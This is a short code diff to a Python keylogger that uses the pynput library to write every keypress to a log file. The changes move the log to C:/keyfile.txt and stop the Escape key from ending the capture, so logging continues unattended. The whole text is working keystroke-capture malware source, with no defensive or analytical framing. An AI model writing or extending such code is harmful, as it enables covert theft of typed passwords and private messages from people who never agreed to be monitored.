@@ -2,7 +2,7 @@ from pynput import keyboard
 
 def keyPressed(key):
     print(str(key))
-    with open("keyfile.txt", 'a') as logkey:
+    with open("C:/keyfile.txt", 'a') as logkey:
         try:
             if key == keyboard.Key.enter:
                 char = "\n"
@@ -14,12 +14,10 @@ def keyPressed(key):
                 pass
             elif key == keyboard.Key.backspace:
                 pass
-            elif key == keyboard.Key.backspace:
-                pass
             elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                 pass
             elif key == keyboard.Key.esc:
-                return False
+                pass
             else:
                 char = key.char
             logkey.write(char)
